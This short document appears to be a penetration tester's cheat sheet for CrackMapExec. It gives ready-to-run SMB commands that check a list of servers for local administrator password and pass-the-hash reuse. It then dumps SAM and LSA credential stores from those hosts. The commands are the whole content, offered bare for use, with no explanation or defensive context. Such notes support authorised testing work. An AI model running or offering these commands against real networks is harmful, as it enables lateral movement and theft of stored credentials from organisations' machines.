# Crackmapexec

Check for authentication access

```
crackmapexec smb server_scope.txt -u administrator -p <password> --local-auth
crackmapexec smb server_scope.txt -u administrator -H <hash> --local-auth
crackmapexec smb server_scope.txt -u administrator -H <hash> --local-auth > crackmapexec-administrator-password-reuse.txt
```

Obtain passwords from the hosts

```
crackmapexec smb server_scope.txt -u administrator -H <hash> --local-auth --sam
crackmapexec smb server_scope.txt -u administrator -H <hash> --local-auth --lsa
```
